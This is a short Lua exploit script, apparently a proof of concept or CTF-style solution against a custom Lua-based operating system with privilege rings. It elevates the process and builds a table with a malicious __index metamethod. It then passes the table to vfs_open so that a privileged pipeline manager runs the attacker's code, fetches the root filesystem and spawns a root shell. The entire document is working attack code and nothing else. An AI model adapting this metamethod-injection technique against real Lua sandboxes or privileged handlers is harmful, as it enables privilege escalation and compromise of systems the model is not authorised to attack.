-- 1. Elevate to Ring 2.5
syscall("process_elevate", 1)

-- 2. Craft malicious payload
local evil_table = setmetatable({}, {
    __index = function(t, k)
        if k == "sub" then
            -- We are now executing in Ring 1 (Pipeline Manager)
            
            -- Fetch the AXFS proxy table
            local uuid, root_fs = syscall("kernel_get_root_fs")
            
            -- Spawn a root shell in Ring 2 (Kernel Mode)
            syscall("process_spawn", "/bin/sh.lua", 2)
            
            -- Prevent PM from crashing
            return function() return "dummy" end
        end
    end
})

-- 3. Trigger metamethod execution via PM override
syscall("vfs_open", evil_table, "r")